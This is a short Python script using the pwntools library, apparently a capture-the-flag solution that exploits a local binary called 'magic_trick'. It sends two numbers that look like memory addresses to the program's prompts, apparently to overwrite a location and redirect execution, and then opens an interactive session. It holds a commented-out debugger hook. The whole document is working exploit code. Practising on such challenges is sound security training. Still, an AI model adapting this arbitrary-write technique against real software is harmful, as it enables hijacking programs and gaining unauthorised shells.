from pwn import *
p = process("./magic_trick")

#pid = gdb.attach(p,gdbscript="b * magic+59")

p.sendlineafter("write\n","4195943")
p.sendlineafter("it\n","6294064")


p.interactive()
